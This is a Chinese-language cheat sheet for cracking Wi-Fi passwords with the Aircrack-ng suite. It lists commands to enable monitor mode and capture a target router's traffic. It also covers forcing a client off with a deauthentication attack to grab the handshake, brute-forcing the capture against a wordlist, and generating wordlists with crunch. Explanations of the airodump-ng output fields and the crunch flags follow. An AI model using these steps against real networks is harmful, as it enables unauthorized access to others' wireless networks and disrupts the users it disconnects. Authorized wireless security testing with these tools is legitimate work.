# Aircrack-ng

Aircrack是目前WEP/WPA/WPA2破解领域中最热门的工具，Aircrack-ng套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。Aircrack-ng是一款多合一整合套件，该套件大致包含下列几种工具：

- Aircrack-ng：无线密码破解
- Aireplay：生成网络数据，去客户端验证
- Airodump-ng：数据包捕捉
- Airbase-ng：配置伪造的接入点

常用命令：

```linux
安装网卡驱动：apt install realtek-rtl88xxau-dkms
开启监听：airmon-ng start wlan0
查看监听：airodump-ng wlan0
监听密码：airodump-ng -c 10 -w wifi-pass --bssid 3C:15:FB:79:4A:38 wlan0
攻击获取：aireplay-ng -0 10 -a 3C:15:FB:79:4A:38 -c 0C:51:01:06:F1:E9 wlan0
破解密码：aircrack-ng wifi-pass-01.ivs -w /root/pass-heji.txt
生成字典：crunch 8 8 -c 100000 -r a -f /usr/share/crunch/charset.lst lalpha-numeric -o wifi-pass.txt

-c 指定用户信道，这个坑了我好久

sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

airodump-ng wlan0的信息列表：

```linux
BSSID   无线AP（路由器）的MAC地址。
PWR     这个值的大小反应信号的强弱，越大越好。越近信号数值就会变得越大,如果接入点的PWR是-1，则表示驱动不支持信号水平
RXQ     丢包率，越小越好，100秒内成功接收到的数据包的百分比表示
Beacons 接入点发出的公告报文的数量，每个接入点每秒大概发送10个公告包（以最低的速率1M），所以通常相距较远时也能收集到它们
Data    这个值非常重要，直接影响到密码PJ的时间长短，如果有用户正在大量数据传输的话，此值增长较快。
/s      过去10秒每秒接收到的数据包数量
CH      无线信道（从beacon包中得到），注意：即使固定了信道，有时也会捕捉到其他信道的数据包，这时由于无线电干扰造成的
MB      连接速度
ENC     表示使用的加密算法。通常有WEP、WPA、TKIP等方式，OPN表示没有加密。
CIPHER  检测出的密码体系，CCMP,WRAP,TKIP,WEP,WEP40和WEP104中的一种。虽然不是必须的，但是TKIP通常用于WPA，CCMP常用于WPA2。当键字索引大于0时，会显示WEP40。（40位时，索引可以是0-3；104位时，索引需为0）
AUTH    使用的认证协议。GMT（WPA/WPA2 使用单独的认证服务器），SKA（WEP共享密钥） ，PSK（WPA/WPA2 预共享密钥），或者OPN（WEP开放认证）
ESSID   无线网络名称。也叫“SSID”，如果开启SSID隐藏模式，则此项为空。在这种情况下，airodump-ng会尝试通过探测响应和关联请求恢复SSID
STATION 每一个已连接或者正尝试连接用户的MAC地址，还没有连接上接入点的用户的BSSID是“not associated”
Lost    过去的10秒钟丢失的数据包数量
Packets 用户发出的数据包数量
Probes  用户探测的无线网络名称，如果还没有连接那么它是用户正尝试连接的网络名称
```

其他：

```linux
8812开启监听：
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
iwconfig 检查wlan0 是否变成monitor模式
airodump-ng wlan0
如果开启监听无法扫到信号，直接拔掉网卡 ，这时终端假死，关掉终端，重新开启终端后再来一次 ；
```

crunch语法：

```crunch
crunch <min> <max> [options]

参数详解
     min    设定最小字符串长度（必选）
     max    设定最大字符串长度（必选）

     oprions
     -b     指定文件输出的大小，避免字典文件过大  
     -c     指定文件输出的行数，即包含密码的个数
     -d     限制相同元素出现的次数 -d 2@
     -e     定义停止字符，即到该字符串就停止生成
     -f     调用库文件（/etc/share/crunch/charset.lst）
     -i     改变输出格式，即aaa,aab -> aaa,baa
     -I     通常与-t联合使用，表明该字符为实义字符
     -m     通常与-p搭配
     -o     将密码保存到指定文件
     -p     指定元素以组合的方式进行
     -q     读取密码文件，即读取pass.txt
     -r     定义重某一字符串重新开始
     -s     指定一个开始的字符，即从自己定义的密码xxxx开始
     -t     指定密码输出的格式
     -u     禁止打印百分比（必须为最后一个选项）
     -z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z  
特殊字符
     %      代表数字
     ^      代表特殊符号
     @      代表小写字母
     ,      代表大写字符
```
